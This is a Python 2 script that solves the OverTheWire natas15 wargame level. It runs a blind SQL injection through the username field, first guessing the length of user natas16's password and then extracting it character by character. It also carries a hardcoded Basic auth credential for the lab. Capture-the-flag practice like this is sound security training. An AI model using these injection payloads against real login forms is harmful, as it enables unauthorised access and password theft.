#http://natas15.natas.labs.overthewire.org/
import requests

url = "http://natas15.natas.labs.overthewire.org/"
password = ""
headers = {
"Authorization":"Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
}

pw_length=0;
for i in range(30,33):
	data = {
		"username":'natas16\" and length(password)=%d#' % i
	}

	print "try: %d" % i
	try:
		res = requests.post(url,headers=headers,data=data)
	except Exception as e:
		continue

	if "This user exists." in res.content:
		print "ok"
		pw_length = i
		break
	else:
		print "no"


print "username:natas16 	password_length: %d" % pw_length

My_filter = '"',"'"

for index in range(len(password)+1,(pw_length)+1):
	for j in range(0x20,0x7f):
		if chr(j) in My_filter:
			continue
		data = {
			"username":'natas16\" and ord(substring(password,%d,1))=%d#' % (index,j)
		} 

		print "try index:%d j:%c" % (index,chr(j))
		try:
			res = requests.post(url,headers=headers,data=data)
		except Exception as e:
			continue

		if "This user exists." in res.content:
			password += chr(j)
			print "Correct!!!!!!!! password: %s" % password    
			break

print "natas 15 flag : %s" % password
